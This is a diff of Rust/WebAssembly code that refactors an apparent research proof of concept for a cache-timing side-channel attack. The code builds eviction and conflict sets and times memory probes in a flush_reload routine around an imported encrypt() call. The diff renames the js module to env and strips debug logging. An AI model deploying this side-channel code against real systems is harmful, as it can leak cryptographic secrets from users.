@@ -1,12 +1,11 @@
 use core::{hint::black_box, mem::ManuallyDrop};
 
 use alloc::{boxed::Box, collections::LinkedList, vec::Vec};
-use js::{encrypt, random, log};
 
 const CACHE_LINE_SIZE : usize = 64;
 const CACHE_ASSOCIATIVITY : usize = 12;
 
-mod js {
+mod env {
     mod unsafe_js {
         #[link(wasm_import_module = "js")]
         extern "C" {
@@ -44,18 +43,18 @@ mod js {
     }
 }
 
-#[no_mangle]
-pub fn probe(target: &[u8], offset: u32) -> u64 {
-    let start = js::get_time();
-    js::access(offset);
-    js::get_time() - start
+#[inline(always)]
+fn probe(target: &[u8], offset: u32) -> u64 {
+    let start = env::get_time();
+    env::access(offset);
+    env::get_time() - start
 }
 
 #[inline(always)]
 fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
     eviction_set
         .iter()
-        .for_each(|offset| js::access(*offset));
+        .for_each(|offset| env::access(*offset));
 }
 
 #[inline(always)]
@@ -102,7 +101,7 @@ fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
         .collect();
     (0..number_of_candidates)
         .map(|_| {
-            let index : usize = (random() * ((candidates.len() - 1) as f64)) as usize;
+            let index : usize = (env::random() * ((candidates.len() - 1) as f64)) as usize;
             candidates.swap_remove(index) as u32
         })
         .collect()
@@ -130,16 +129,6 @@ pub extern "C" fn my_dealloc(ptr: *mut u8, len: usize) {
 pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32, time_slot_size: u32, probes: *mut u32, probe_size: usize, target: *mut u8, target_size: usize) -> Box<[u32]> {
     let target = unsafe { core::slice::from_raw_parts(target, target_size) };
     let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };
-    log(threshold as u64);
-    log(wait_cycles as u64);
-    log(time_slots as u64);
-    log(time_slot_size as u64);
-    log(js::get_time() as u64);
-    log(js::get_time() as u64);
-    log(js::get_time() as u64);
-    log(js::get_time() as u64);
-    log(js::get_time() as u64);
-    log(js::get_time() as u64);
 
     let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
     let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
@@ -147,17 +136,17 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
         .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold as u64))
         .collect();
     let conflict_set : LinkedList<u32> = generate_conflict_set(&eviction_sets);
-    encrypt();
+    env::encrypt();
     let mut results : Vec<u32> = (0..time_slots)
         .flat_map(|_| {
-            let start = js::get_time();
+            let start = env::get_time();
             let time_slot_results : Vec<u32> = probes
                 .iter()
                 .map(|p| probe(target, *p) as u32)
                 .collect();
 
             evict(target.as_ref(), &conflict_set);
-            while js::get_time() - start < time_slot_size as u64 {
+            while env::get_time() - start < time_slot_size as u64 {
                 wait(wait_cycles);
             }
             time_slot_results
